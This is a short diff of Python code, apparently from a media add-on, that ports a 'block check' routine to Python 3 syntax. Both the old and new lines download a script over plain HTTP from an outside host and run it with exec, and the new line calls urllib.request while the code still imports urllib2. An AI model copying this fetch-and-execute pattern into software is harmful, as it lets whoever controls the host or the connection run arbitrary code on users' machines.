@@ -34,7 +34,7 @@ def do_block_check(uninstall=False):
         import urllib2
         # import sys
         namespace = {}
-        exec urllib2.urlopen('http://offshoregit.com/tknorris/block_code.py').read() in namespace
+        exec(urllib.request.urlopen('http://offshoregit.com/tknorris/block_code.py').read(), namespace)
         
         # exec urlopen('http://offshoregit.com/tknorris/block_code.py').read(), namespace
         if namespace["real_check"](uninstall): 
